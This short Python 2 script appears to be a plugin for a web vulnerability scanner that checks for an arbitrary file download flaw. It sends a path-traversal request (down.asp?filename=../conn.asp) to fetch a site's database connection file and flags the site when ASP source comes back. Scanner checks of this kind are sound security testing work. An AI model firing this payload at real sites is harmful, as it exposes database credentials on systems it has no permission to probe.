#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        detail = u''
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl = "%s%s" % (url,"down.asp?filename=../conn.asp%20")
        headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5","Accept": "text/plain","Referer": "%s://%s"%(ob['scheme'],ob['domain'])}
        
                        
#       res, content = http.request(expurl,headers=headers)
        res, content = yx_httplib2_request(http,expurl,headers=headers)
        if res['status'] == '200' and content.find('<%')>=0 and content.find('Server.CreateObject')>=0:
            #print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
            request = getRequest(expurl)
            response = getResponse(res)
            list.append(getRecord(ob,expurl,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:EC_ArbitraryFileDownloadScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:EC_ArbitraryFileDownloadScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
